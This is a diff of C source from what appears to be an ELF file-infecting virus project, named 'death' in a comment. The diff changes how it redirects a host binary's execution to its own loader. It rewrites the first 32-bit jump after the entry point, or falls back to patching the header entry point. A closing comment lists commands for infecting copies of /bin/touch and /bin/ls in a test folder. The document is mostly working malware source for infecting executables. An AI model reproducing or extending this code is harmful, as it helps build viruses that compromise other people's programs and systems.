@@ -33,16 +33,16 @@ static void	*get_client_jump_destination(void *client_jump_ptr)
 	return ((client_jump_ptr + JUMP32_INST_SIZE) + *client_jump_value);
 }
 
-static void	write_jump_to_client(void *loader_jump_ptr, void *client_jump_destination)
+static void	write_jump_to_client(void *loader_jmpclient_ptr, void *client_jump_destination)
 {
-	int32_t	value = (int32_t)(client_jump_destination - (loader_jump_ptr + JUMP32_INST_SIZE));
+	int32_t	value = (int32_t)(client_jump_destination - (loader_jmpclient_ptr + JUMP32_INST_SIZE));
 
-	write_jump(loader_jump_ptr, value, DWORD);
+	write_jump(loader_jmpclient_ptr, value, DWORD);
 }
 
-static void	write_jump_to_virus(void *client_jump_ptr, void *loader_code_ptr)
+static void	write_jump_to_virus(void *client_jump_ptr, const void *loader_entry_ptr)
 {
-	int32_t	value = (int32_t)(loader_code_ptr - client_jump_ptr) - JUMP32_INST_SIZE;
+	int32_t	value = (int32_t)(loader_entry_ptr - client_jump_ptr) - JUMP32_INST_SIZE;
 
 	write_jump(client_jump_ptr, value, DWORD);
 }
@@ -54,130 +54,61 @@ static inline bool	is_jump32(uint8_t *code)
 	return (*code == 0xe9);
 }
 
-static void	*step_instruction(void *client_code_ptr, size_t instruction_length)
+static void	*find_first_jump(struct safe_ptr clone_ref, size_t entry_offset)
 {
-	void		*rip = NULL;
-	uint8_t		*p = (uint8_t*)client_code_ptr;
-	uint8_t		prefix = 0;
-	uint8_t		opcode;
-	int32_t		jmp_value = 0;
-
-next_opcode:
-	opcode = *p++;
-
-	// check if has prefix
-	if (opcode == 0x0f) {prefix |= OP_PREFIX_0F; goto next_opcode;}
-	// check if has REX
-	if (opcode >= 0x40 && opcode <= 0x4f) {goto next_opcode;}
-
-	// rel8
-	if ((opcode >= 0x70 && opcode <= 0x7f)           // JMPcc
-	|| (opcode >= 0xe0 && opcode <= 0xe3)            // LOOP/LOOPcc/JMPcc
-	|| (opcode == 0xeb))                             // JMP
-	{
-		jmp_value = *((int8_t*)p);
-		rip = (client_code_ptr + instruction_length) + jmp_value;
-	}
-	// ff 25 7a bb 21 00 rip jmp
-	// rel16/32
-	else if ((opcode == 0xe8)                          // CALL
-	|| (opcode == 0xe9)                                // JMP
-	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) // JMPcc
-	{
-		jmp_value = *((int32_t*)p);
-		rip = (client_code_ptr + instruction_length) + jmp_value;
-	}
-	else if (opcode == 0xff)
-	{
-		opcode = *p++;
-
-		uint8_t	mod = (opcode & 0b11000000) >> 6;
-		uint8_t	reg = (opcode & 0b00111000) >> 3;
-		uint8_t	rm  = (opcode & 0b00000111);
-
-		if (mod == 0b00 && reg == 0b100 && rm == 0b101)
-		{
-			jmp_value = *((int32_t*)p);
-			rip = (client_code_ptr + instruction_length) + jmp_value;
-		}
-	}
-	else
-	{
-		rip = client_code_ptr + instruction_length;
-	}
-	return rip;
-}
-
-static size_t	fill_jump_array(size_t **array, void *client_code_ptr, void *loader_code_ptr)
-{
-	size_t		njump = 0;
+	size_t	offset = entry_offset;
+	void	*code  = safe(clone_ref, offset, INSTRUCTION_MAXLEN);
 
 	while (true)
 	{
-		if (!known_instruction(client_code_ptr, 16))
-		{
-			break ;
-		}
-		size_t	instruction_length = disasm_length(client_code_ptr, 16);
+		if (code == NULL)
+			return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
 
+		if (!known_instruction(code, INSTRUCTION_MAXLEN))
+			return !(bool)"";
+
+		size_t	instruction_length = disasm_length(code, INSTRUCTION_MAXLEN);
 		if (instruction_length == 0)
-			return 0;
+			return !(bool)"";
 
-		if (is_jump32(client_code_ptr))
-		{
-			array[njump++] = client_code_ptr;
+		if (is_jump32(code))
+			return code;
 
-			if (njump == MAX_JUMP_LOCATIONS)
-				break ;
-			putchar('-'); putchar('>'); putchar(' ');
-		}
-		putchar('0'); putchar('x'); putu64(client_code_ptr); putchar('\n');
-		client_code_ptr = step_instruction(client_code_ptr, instruction_length);
+		code = step_instruction(clone_ref, code, instruction_length);
 	}
-	return njump;
 }
 
 static bool	change_client_jump(struct safe_ptr clone_ref,
 			size_t entry_offset, size_t payload_offset,
 			size_t dist_payload_entry,
-			size_t dist_client_loader,
-			size_t *seed)
+			size_t dist_jmpclient_loader)
 {
 	// get pointers
-	size_t	loader_jump_offset = payload_offset + dist_client_loader;
+	size_t	loader_jump_offset = payload_offset + dist_jmpclient_loader;
 
-	void	*loader_jump_ptr = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);
-	void	*loader_code_ptr = safe(clone_ref, payload_offset, 0);
-	void	*client_code_ptr = safe(clone_ref, entry_offset, dist_payload_entry);
+	const void	*loader_entry_ptr = safe(clone_ref, payload_offset, 0);
+	void		*loader_jmpclient_ptr = safe(clone_ref, loader_jump_offset, JUMP32_INST_SIZE);
 
-	if (!client_code_ptr || !loader_jump_ptr || !loader_code_ptr)
-		return false;
+	if (!loader_jmpclient_ptr || !loader_entry_ptr)
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER_CODE);
 
-	// fill jumps array
-	size_t	*client_jump_ptrs[MAX_JUMP_LOCATIONS] = {NULL};
-	size_t	njump = fill_jump_array(client_jump_ptrs, client_code_ptr, loader_code_ptr);
+	// find first client jmp
+	void	*client_first_jump = find_first_jump(clone_ref, entry_offset);
 
-	if (njump == 0)
-		return false;
+	if (client_first_jump == NULL)
+		return errors(ERR_THROW, _ERR_T_CHANGE_CLIENT_JUMP);
 
-	// select a jump
-	size_t	index = random_inrange(seed, 0, njump - 1);
-	void	*client_jump_ptr = client_jump_ptrs[index];
+	// modify jump
+	void	*client_jump_dst = get_client_jump_destination(client_first_jump);
 
-	if (client_jump_ptr == 0)
-		return false;
-
-	// modify jumps
-	void	*client_jump_dst = get_client_jump_destination(client_jump_ptr);
-
-	write_jump_to_client(loader_jump_ptr, client_jump_dst);
-	write_jump_to_virus(client_jump_ptr, loader_code_ptr);
+	write_jump_to_client(loader_jmpclient_ptr, client_jump_dst);
+	write_jump_to_virus(client_first_jump, loader_entry_ptr);
 
 	return true;
 }
 
 bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
-		size_t dist_client_loader, size_t *seed)
+		size_t dist_jmpclient_loader)
 {
 	Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
 	size_t		offset_in_section  = file_entry->offset_in_section;
@@ -185,12 +116,10 @@ bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry,
 	size_t		payload_offset     = file_entry->end_of_last_section;
 	Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;
 
-	if (!change_client_jump(clone_ref, entry_offset, payload_offset, dist_payload_entry, dist_client_loader, seed))
+	// if (!change_client_jump(clone_ref, entry_offset, payload_offset, dist_payload_entry, dist_jmpclient_loader))
 		change_header_entry(clone_ref, dist_payload_entry);
 
 	return true;
 }
 
-// /bin/ls loader vaddr -> 0x41da64
-// infect -> 0x40264b
-// return <- 0x4022e0
+// make logs ; rm /tmp/test/* ; cp /bin/touch /tmp/test ; ./death ; rm touch0 ; mv /tmp/test/touch touch0 ; cp /bin/ls /tmp/test
